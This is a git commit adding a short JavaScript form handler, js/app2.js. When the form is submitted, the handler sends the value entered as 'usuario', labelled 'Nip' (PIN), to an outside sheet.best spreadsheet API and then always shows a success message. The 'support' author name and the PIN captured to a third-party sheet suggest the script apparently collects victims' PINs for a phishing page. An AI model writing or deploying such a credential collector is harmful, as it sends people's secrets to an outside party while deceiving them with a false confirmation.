7b5cc0739bfcc8571dceafaa72c7b7fa58061c61
Soporte-42 <ofunzy@gmail.com>
2024-06-25 17:09:44 -0600

    Add files via upload

---
+++ js/app2.js
@@ -0,0 +1,29 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/9135f882-6f54-41a6-8922-744bcc6e09bd', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Nip": formulario.usuario.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
